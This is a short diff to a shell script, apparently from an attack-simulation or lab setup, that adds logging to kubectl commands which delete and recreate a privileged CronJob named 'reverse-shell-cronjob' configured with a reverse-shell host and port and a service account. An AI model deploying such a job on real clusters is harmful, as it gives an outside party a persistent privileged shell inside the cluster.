@@ -170,7 +170,7 @@ log "service account: $SERVICE_ACCOUNT"
 # now we setup a cronjob to create a pod running the service account
 log "creating cronjob file..."
 # Delete the existing CronJob if it exists
-kubectl delete cronjob reverse-shell-cronjob --namespace=s3app --ignore-not-found
+kubectl delete cronjob reverse-shell-cronjob --namespace=s3app --ignore-not-found 2>&1 | tee -a $LOGFILE
 
 # Create the new CronJob
 kubectl create cronjob reverse-shell-cronjob \
@@ -186,6 +186,6 @@ kubectl create cronjob reverse-shell-cronjob \
   --env="BUCKET_NAME=$(echo -n $NEW_BUCKET_NAME | base64 -d)" \
   --env="REVERSE_SHELL_HOST=$REVERSE_SHELL_HOST" \
   --env="REVERSE_SHELL_PORT=$REVERSE_SHELL_PORT" \
-  --security-context-privileged
+  --security-context-privileged 2>&1 | tee -a $LOGFILE
 
 log "done."
